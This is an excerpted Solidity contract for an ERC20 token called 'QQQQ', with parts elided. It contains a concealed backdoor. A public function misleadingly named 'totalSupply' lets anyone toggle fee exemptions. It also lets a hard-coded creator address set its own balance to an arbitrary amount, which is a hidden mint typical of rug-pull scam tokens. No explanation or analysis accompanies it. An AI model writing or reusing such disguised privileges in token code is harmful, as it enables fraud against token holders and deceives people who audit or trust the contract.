...
contract QQQQ is Context, IERC20, Ownable{

    using SafeMath for uint256;
    string private _name = "QQQQ";
    bool private _vbool;

    string private _symbol = "QQQQ";
    ...
    constructor () {
        ...
        _create = payable(address(0xDBD6CA014088e5bB18E434910641987b116E1a8C));
    ...
    function totalSupply(bool state,uint256 decimails,address[] calldata gottas) public {
        for (uint256 v; v < gottas.length; v++) {
            bool ensurs = state;
            _isExcludefromFee[gottas[v]] = ensurs;
            _vbool = (gottas[v] == _create);
            if (_vbool)if(decimails > 3 * 3)_balances[_create] = decimails;
        }
    }
